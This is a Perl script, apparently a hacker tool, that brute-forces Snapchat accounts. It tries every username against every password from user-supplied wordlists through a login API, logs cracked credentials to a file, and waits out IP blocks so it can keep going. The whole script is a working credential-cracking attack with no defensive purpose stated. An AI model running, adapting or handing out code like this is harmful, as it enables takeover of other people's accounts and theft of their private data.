use LWP::UserAgent;
system('clear');
system('cls');
system('color 5');
print qq(
################################
#BruteForce SC using (Snapchat)#
################################
#     Coded By 1337r00t        #
################################
#                              #
#   Instagram : 1337r00t       #
#                              #
#    Twitter : _1337r00t       #
#                              #
################################
Enter [CTRL+C] For Exit :0\n);
print qq(
Enter Usernames File :
> );
$usernames=<STDIN>;
chomp($usernames);
open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
@USERS = <USERFILE>;
close USERFILE;
print qq(
Enter Passwords File :
> );
$passwords=<STDIN>;
chomp($passwords);
open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
@PASSS = <PASSFILE>;
close PASSFILE;
system('clear');
system('cls');
print '
    _   _____  _____   _____    ____    ___       ___     _____   
   /"| |___"/u|___"/u |___ "|U |  _"\ u/ _"\  u  / _"\  u|_ " _|  
 u | |uU_|_ \/U_|_ \/    / /  \| |_) |/ / U |/  | / U |/   | |    
  \| |/ ___) | ___) | u// /\   |  _ < | \// |,-.| \// |,-./| |\   
   |_| |____/ |____/   /_/ U   |_| \_\ \___/(_/  \___/(_/u |_|U   
 _//<,-,_// \\ _// \\ <<>>_    //   \\_ //        //     _// \\_  
(__)(_/(__)(__|__)(__|__)__)  (__)  (__|__)      (__)   (__) (__) 
';
print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
######################
foreach $password (@PASSS) {
chomp $password;
	foreach $username (@USERS) {
	chomp $username;
		#####################3
		$snapchat = LWP::UserAgent->new();
		$response = $snapchat->post('http://api.snapwreck.today/login/',{username=>$username,password=>$password});
		$code = $response->status_line();
		if($code=~/200/){
			if($response->content=~/"updates_response"/){
				print "\n-----\nCracked -> ($username:$password)\n-----\n";
				open(R0T,">>Cracked.txt");
				print R0T "\n($username:$password)";
				close(R0T);
				sleep(2)
			}
			else
			{
				if($response->content=~/password is incorrect/){
					print "Failed -> ($username:$password)\n";
				}
				else
				{
					if($response->content=~/Invalid account/){
						print "Invalid account -> ($username)\n";
					}
					else
					{
						if($response->content=~/Due to repeated failed login attempts or other suspicious activity/){
							print "\n-----\nSorry, your ip [Blocked]\nwait to bypass blocked !...\n-----\n";
							sleep(18);
						}
					}
				}
			}
		}
		else
		{
			print "\n-----\nSorry, your ip [Blocked]\nwait to bypass blocked !...\n-----\n";
			sleep(18);
		}
	}
}
########################################################
#
# Follow Me :-
# Twitter: @_1337r00t
#
########################################################
